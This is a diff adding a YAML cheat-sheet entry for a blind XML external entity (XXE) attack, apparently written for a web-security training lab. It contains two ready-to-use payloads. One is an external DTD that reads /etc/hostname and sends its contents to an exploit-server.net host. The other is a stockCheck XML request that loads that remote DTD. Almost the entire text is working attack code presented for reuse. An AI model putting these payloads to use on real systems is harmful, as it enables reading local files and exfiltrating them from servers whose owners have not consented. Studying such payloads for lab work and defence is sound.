@@ -1,0 +1,25 @@
+name: XXE external dtd
+description: XXE attack with an external hosted dtd file.
+commands:
+  - command: |
+      <!ENTITY % file SYSTEM "file:///etc/hostname">
+      <!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'https://exploit-0abd004f034a3ca18694038401ae00d6.exploit-server.net?content=%file;'>">
+      %oob;
+      %content;
+    description: External hosted dtd, which exfiltrates /etc/hostname to an exploit server. The % symbol inside the oob entity has to be hex encoded.
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE stockCheck [ 
+        <!ENTITY % remote SYSTEM "https://exploit-0abd004f034a3ca18694038401ae00d6.exploit-server.net/exploit2.dtd">
+        %remote;
+      ]>
+      <stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+    description: Payload to load the external dtd file and call %remote.
+tags:
+  - xxe
+  - lfi
+show:
+links:
+  -
+references:
+  -
